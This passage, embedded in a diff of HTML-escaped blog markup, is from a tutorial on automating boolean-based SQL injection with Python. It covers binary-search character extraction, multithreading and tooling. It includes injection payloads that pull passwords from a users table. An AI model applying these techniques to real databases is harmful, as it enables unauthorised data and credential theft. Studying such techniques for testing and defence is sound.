punctuation&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; val &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; mid&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+            high &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; mid  &lt;span class=&quot;token comment&quot;&gt;# Eliminate upper half.&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+            low &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; mid   &lt;span class=&quot;token comment&quot;&gt;# Eliminate lower half.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&quot;toolbar&quot;&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;button class=&quot;copy-to-clipboard-button&quot; type=&quot;button&quot; title=&quot;Copy Code&quot;&gt;&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;Here’s a quick example, where we progress towards 125 in 7 steps (which will translate to 7 HTTP requests later on).&lt;/p&gt;
+&lt;div class=&quot;code-toolbar&quot;&gt;&lt;pre class=&quot;command-line language-python&quot; data-prompt=&quot;&gt;&gt;&gt;&quot; data-filter-output=&quot;out&gt;&quot; data-lang-off=&quot;&quot; tabindex=&quot;0&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;command-line-prompt&quot;&gt;&lt;span data-prompt=&quot;&gt;&gt;&gt;&quot;&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token command&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;result:&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; binary_search&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;125&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;token output&quot;&gt;  0 - 128       Guess:   64&lt;/span&gt;
+&lt;span class=&quot;token output&quot;&gt; 64 - 128       Guess:   96&lt;/span&gt;
+&lt;span class=&quot;token output&quot;&gt; 96 - 128       Guess:  112&lt;/span&gt;
+&lt;span class=&quot;token output&quot;&gt;112 - 128       Guess:  120&lt;/span&gt;
+&lt;span class=&quot;token output&quot;&gt;120 - 128       Guess:  124&lt;/span&gt;
+&lt;span class=&quot;token output&quot;&gt;124 - 128       Guess:  126&lt;/span&gt;
+&lt;span class=&quot;token output&quot;&gt;124 - 126       Guess:  125&lt;/span&gt;
+&lt;span class=&quot;token output&quot;&gt;result: 125&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&quot;toolbar&quot;&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;button class=&quot;copy-to-clipboard-button&quot; type=&quot;button&quot; title=&quot;Copy Code&quot;&gt;&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;In the code snippets above, &lt;code&gt;val&lt;/code&gt; is known for demo purposes. But in reality, &lt;code&gt;val&lt;/code&gt; is unknown; it’s the data we’re trying to exfiltrate. To be more realistic, let&#39;s replace the &lt;code&gt;val&lt;/code&gt; comparisons with a function &lt;code&gt;check_sql_value()&lt;/code&gt; which sends network requests.&lt;/p&gt;
+&lt;div class=&quot;code-toolbar&quot;&gt;&lt;pre data-lang-off=&quot;&quot; class=&quot;language-python&quot; tabindex=&quot;0&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;binary_search&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;sql_query&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; idx&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; low&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; high&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token triple-quoted-string string&quot;&gt;&quot;&quot;&quot;Find the value of sql_query using binary search, between
+    low (inclusive) and high (exclusive). Assuming the guessed value
+    is within range.&quot;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; low &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; high&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        mid &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;low &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; high&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; low &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; mid&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; mid &lt;span class=&quot;token comment&quot;&gt;# Found val.&lt;/span&gt;
+        
+        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; check_sql_value&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;sql_query&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; idx&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; mid&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+            high &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; mid
+        &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+            low &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; mid
+
+&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;check_sql_value&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;sql_query&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; idx&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; guess&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token comment&quot;&gt;# Make web request to check ASCII(SUBSTRING(sql_query, idx, 1)) &amp;lt; guess.&lt;/span&gt;
+    &lt;span class=&quot;token comment&quot;&gt;# And then check if the response is a TRUE or FALSE response.&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; idx &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    val &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; binary_search&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;@@version&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; idx&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;token comment&quot;&gt;# Handle `val`...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&quot;toolbar&quot;&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;button class=&quot;copy-to-clipboard-button&quot; type=&quot;button&quot; title=&quot;Copy Code&quot;&gt;&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;The idea here is we can pass an SQL query, such as &lt;code&gt;@@version&lt;/code&gt; or &lt;code&gt;sqlite_version()&lt;/code&gt;, followed by the index and expected ranged.&lt;/p&gt;
+&lt;div class=&quot;code-toolbar&quot;&gt;&lt;pre data-lang-off=&quot;&quot; class=&quot;language-python&quot; tabindex=&quot;0&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;binary_search&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;@@version&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; idx&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; low&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; high&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&quot;toolbar&quot;&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;button class=&quot;copy-to-clipboard-button&quot; type=&quot;button&quot; title=&quot;Copy Code&quot;&gt;&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;We can make the code more generic or flexible, but the underlying idea is there.&lt;/p&gt;
+&lt;h2 id=&quot;more-sql-tricks&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#more-sql-tricks&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; More SQL Tricks&lt;/h2&gt;
+&lt;p&gt;Not all types of data are easy to exfiltrate. Here are some tricks I&#39;ve picked up (some of which could be scripted):&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Use subqueries to select data from arbitrary tables.
+&lt;ul&gt;
+&lt;li&gt;e.g. &lt;code&gt;ASCII(SUBSTRING((SELECT password FROM users LIMIT 1 OFFSET 5), 1, 1))&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;GROUP_CONCAT&lt;/code&gt; to combine multiple rows into one row. This function is available in MySQL and SQLite.
+&lt;ul&gt;
+&lt;li&gt;Subqueries only work when 1 row and 1 column is selected.&lt;/li&gt;
+&lt;li&gt;Occasionally, there is a &lt;em&gt;lot&lt;/em&gt; of data across multiple rows.
+&lt;ul&gt;
+&lt;li&gt;We can use &lt;code&gt;LIMIT&lt;/code&gt; (or &lt;code&gt;TOP&lt;/code&gt; for SQL Server) to restrict the data to one row.&lt;/li&gt;
+&lt;li&gt;Or we could &lt;code&gt;GROUP_CONCAT&lt;/code&gt; to capture more data in a single subquery. Then there would be one less number to change.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Cast SQL output to &lt;code&gt;char&lt;/code&gt;/&lt;code&gt;varchar&lt;/code&gt; to capture numbers, dates, and other types.
+&lt;ul&gt;
+&lt;li&gt;e.g. &lt;code&gt;CAST(id AS VARCHAR(32))&lt;/code&gt; in MySQL&lt;/li&gt;
+&lt;li&gt;Cast with &lt;code&gt;NULL&lt;/code&gt;, may not work. Additional &lt;code&gt;NULL&lt;/code&gt;-checks may be needed.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;adding-multithreading&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#adding-multithreading&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Adding Multithreading&lt;/h2&gt;
+&lt;p&gt;Now that we&#39;ve optimised the reading of a single character, can we also speed up the reading of an entire string?&lt;/p&gt;
+&lt;p&gt;Yes! Thanks to concurrency! For this, we&#39;ll reach for Python&#39;s built-in &lt;code&gt;concurrent.futures&lt;/code&gt; library, which provides several high-level threading tools. The choice boils down to using threads (via &lt;code&gt;ThreadPoolExecutor&lt;/code&gt;) or processes (&lt;code&gt;ProcessPoolExecutor&lt;/code&gt;), and considering how data/processing is distributed.&lt;/p&gt;
+&lt;h3 id=&quot;threads-vs-processes&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#threads-vs-processes&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Threads vs. Processes&lt;/h3&gt;
+&lt;p&gt;Time for a quick comparison.&lt;/p&gt;
+&lt;p&gt;Threads:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;lightweight and quick to create&lt;/li&gt;
+&lt;li&gt;shares memory with main process&lt;/li&gt;
+&lt;li&gt;one &lt;abbr data-bs-placement=&quot;top&quot; data-bs-toggle=&quot;tooltip&quot; title=&quot;Global Interpreter Lock, a feature of the Python interpreter which only allows one thread to run at a given time&quot;&gt;GIL&lt;/abbr&gt; to rule them all&lt;/li&gt;
+&lt;li&gt;recommended for IO-bound tasks (network, requests)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Processes:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;slower to create&lt;/li&gt;
+&lt;li&gt;doesn&#39;t share memory&lt;/li&gt;
+&lt;li&gt;each process has their own GIL&lt;/li&gt;
+&lt;li&gt;recommended for CPU-bound tasks (intense computations, calculations)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Note: GIL behaviour may change in Python 3.13+, so expect some updates in the (concurrent.)future.&lt;/p&gt;
+&lt;p&gt;Reference: &lt;a href=&quot;https://stackoverflow.com/questions/3044580/multiprocessing-vs-threading-python&quot;&gt;StackOverflow – Multiprocessing vs. Threading in Python&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;using-threadpoolexecutor&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#using-threadpoolexecutor&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Using ThreadPoolExecutor&lt;/h3&gt;
+&lt;p&gt;In the end, I used &lt;code&gt;ThreadPoolExecutor&lt;/code&gt;, since our code was constrained by network requests. The shared memory also means we don&#39;t need to worry about parameters and duplication as much. Even though the GIL prevents us from (strictly) executing in parallel, we do observe some speedup.&lt;/p&gt;
+&lt;p&gt;In the code snippet below, we create a task for each character of the string. (Assume the length of the string is known.) When a thread finishes searching for a character, the thread is recycled and picks up the next task, then the next, and so on until all tasks are done.&lt;/p&gt;
+&lt;p&gt;We can process finished tasks as they roll in using &lt;code&gt;concurrent.futures.as_completed&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;code-toolbar&quot;&gt;&lt;pre data-lang-off=&quot;&quot; class=&quot;language-python&quot; tabindex=&quot;0&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;with&lt;/span&gt; concurrent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;futures&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;ThreadPoolExecutor&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;max_workers&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;as&lt;/span&gt; executor&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    future_map &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;token comment&quot;&gt;# Create a task for each character.&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; idx &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;length&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        future &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; executor&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;submit&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;get_by_bsearch&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string-interpolation&quot;&gt;&lt;span class=&quot;token string&quot;&gt;f&quot;ASCII(SUBSTRING((&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;sql&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;idx&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;,1))&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+        future_map&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;future&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; idx
+
+    &lt;span class=&quot;token comment&quot;&gt;# Handle finished tasks concurrently.&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; future &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; concurrent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;futures&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;as_completed&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;future_map&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        idx &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; future_map&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;future&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+        ch &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; future&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;result&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;token comment&quot;&gt;# We found the character at a particular index!&lt;/span&gt;
+        &lt;span class=&quot;token comment&quot;&gt;# Store it somewhere...&lt;/span&gt;
+        somewhere&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;idx&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ch&lt;/code&gt;&lt;/pre&gt;&lt;div class=&quot;toolbar&quot;&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;button class=&quot;copy-to-clipboard-button&quot; type=&quot;button&quot; title=&quot;Copy Code&quot;&gt;&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;The length of the string can be determined beforehand with another binary search. Assuming the max length is 2048...&lt;/p&gt;
+&lt;div class=&quot;code-toolbar&quot;&gt;&lt;pre data-lang-off=&quot;&quot; class=&quot;language-python&quot; tabindex=&quot;0&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;length &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; get_by_bsearch&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string-interpolation&quot;&gt;&lt;span class=&quot;token string&quot;&gt;f&quot;LENGTH((&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;sql&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;))&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2048&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&quot;toolbar&quot;&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;button class=&quot;copy-to-clipboard-button&quot; type=&quot;button&quot; title=&quot;Copy Code&quot;&gt;&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;h2 id=&quot;adding-comfort-features&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#adding-comfort-features&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Adding Comfort Features&lt;/h2&gt;
+&lt;p&gt;Aside from a tool’s utility, we should also consider &lt;em&gt;user experience&lt;/em&gt;. We want to design the tool to be convenient for ourselves, and potentially other users. For instance, we shouldn’t have to modify code to change general settings (e.g. the target URL). And it&#39;d be nice to have visual feedback; waiting can be boring.&lt;/p&gt;
+&lt;p&gt;Here are some things we&#39;ll add to our automation:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Command Line Arguments&lt;/li&gt;
+&lt;li&gt;Progress Bar&lt;/li&gt;
+&lt;li&gt;Interactive Interface&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;At this point, it’s mostly about choosing mature libraries, looking at documentation, and playing around with code. I’ll list some libraries I found useful/interesting.&lt;/p&gt;
+&lt;h3 id=&quot;command-line-arguments&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#command-line-arguments&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Command Line Arguments&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://docs.python.org/3/library/argparse.html&quot;&gt;&lt;code&gt;argparse&lt;/code&gt;&lt;/a&gt;, built-in, robust, used almost everywhere&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/google/python-fire&quot;&gt;&lt;code&gt;python-fire&lt;/code&gt;&lt;/a&gt;, convenient wrapper which generates command-line arguments from function annotations. (Looks interesting but I haven’t used.)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;progress-bar&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#progress-bar&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Progress Bar&lt;/h3&gt;
+&lt;p&gt;Common options are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/Textualize/rich&quot;&gt;&lt;code&gt;rich&lt;/code&gt;&lt;/a&gt;, colourful, great look-and-feel&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/tqdm/tqdm&quot;&gt;&lt;code&gt;tqdm&lt;/code&gt;&lt;/a&gt;, traditional rectangular progress bar&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;Example of a `rich` progress bar in action.&quot; href=&quot;https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/progress-bar-1743w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-100 &quot; src=&quot;https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/progress-bar-1743w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 1743 / 198&quot; alt=&quot;Example of a `rich` progress bar in action.&quot; title=&quot;Example of a `rich` progress bar in action.&quot; srcset=&quot;https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/progress-bar-256w.webp 256w, https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/progress-bar-512w.webp 512w, https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/progress-bar-1024w.webp 1024w, https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/progress-bar-1743w.webp 1743w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1743px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Some challenges arise when mixing progress bars with multithreading. In general...&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Dropping to a lower-level API helps alleviate issues. For example, &lt;code&gt;rich&lt;/code&gt; allows you to control how tasks are added, updated, and removed.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;KeyboardInterrupt&lt;/code&gt; and Exceptions should be carefully handled. You &lt;em&gt;do&lt;/em&gt; want &lt;code&gt;^C&lt;/code&gt; to work right?
+&lt;ul&gt;
+&lt;li&gt;&amp;quot;Boss, we accidentally swamped the hospital&#39;s database with our script. Their server was weak.&amp;quot;&lt;/li&gt;
+&lt;li&gt;&amp;quot;Stop it! Millions of lives are at stake!&amp;quot;&lt;/li&gt;
+&lt;li&gt;&amp;quot;We can&#39;t... Control-C doesn&#39;t work!&amp;quot;&lt;/li&gt;
+&lt;li&gt;&amp;quot;You leave me no choice.&amp;quot; &lt;em&gt;(pours water over computer)&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;interactive-interface&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#interactive-interface&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Interactive Interface&lt;/h3&gt;
